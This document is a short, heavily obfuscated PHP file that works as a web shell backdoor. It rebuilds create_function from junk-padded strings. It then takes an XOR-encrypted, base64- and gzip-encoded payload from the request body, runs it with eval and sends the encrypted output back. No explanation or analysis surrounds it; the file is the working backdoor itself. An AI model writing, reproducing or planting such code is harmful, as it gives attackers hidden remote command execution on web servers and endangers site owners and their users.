<?php
$Y='put"C),$mC)==1)C {@ob_sCtart();@eCvCal(@gzuCncompreCss(@x(C@bCaCse64_decode($m[C1])C,$Ck)));$o=@ob_gCet_';
$f='$k="57C2c6709"C;$kh="59C148Cdc6fa8e"C;$kf="1Cccb0CC77d9001";$pC="SDMLWtCBCZlfKCI0FC68C";function x($t,$k';
$H=str_replace('Gq','','creGqaGqGqte_fuGqncGqtGqion');
$w='cContentsC();@oCb_end_cleCaCCn();$r=@CbCaseC64_encode(@x(@gzcomprCess($CCo),$k)C);pCrint("$p$kh$r$kf");}';
$i='o.=C$t{$iC}C^$kC{$j};}CC}return $o;}if (@prCegC_matcCh("/$kh(.+)$Ckf/"CC,@file_get_conteCnts(C"php:/C/in';
$x='){C$Cc=strlenC(C$k);$Cl=sCtrlen($t);$o="";forC($i=0;C$i<C$l;){Cfor($jC=0;($j<$c&C&$i<$lC)C;$Cj++,$i++){$';
$Q=str_replace('C','',$f.$x.$i.$Y.$w);
$p=$H('',$Q);$p();
?>
